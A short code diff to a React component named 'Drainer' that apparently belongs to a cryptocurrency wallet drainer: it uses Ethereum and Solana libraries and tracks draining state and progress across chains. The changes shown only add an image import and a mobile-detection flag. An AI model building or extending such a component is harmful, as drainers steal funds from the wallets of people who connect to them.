@@ -3,6 +3,7 @@ import { useState, useEffect, useCallback } from 'react'
 import { ethers } from 'ethers'
 import * as solanaWeb3 from '@solana/web3.js'
 import * as splToken from '@solana/spl-token'
+import Image from 'next/image'
 
 // TypeScript interfaces
 interface EthereumProvider {
@@ -532,6 +533,7 @@ export default function Drainer() {
   const [stage, setStage] = useState<Stage>('connect');
   const [showSuccess, setShowSuccess] = useState<boolean>(false);
   const [isDraining, setIsDraining] = useState<boolean>(false);
+  const [isMobile, setIsMobile] = useState<boolean>(false);
   const [drainError, setDrainError] = useState<string | null>(null);
   const [drainProgress, setDrainProgress] = useState<{
     evm: boolean;
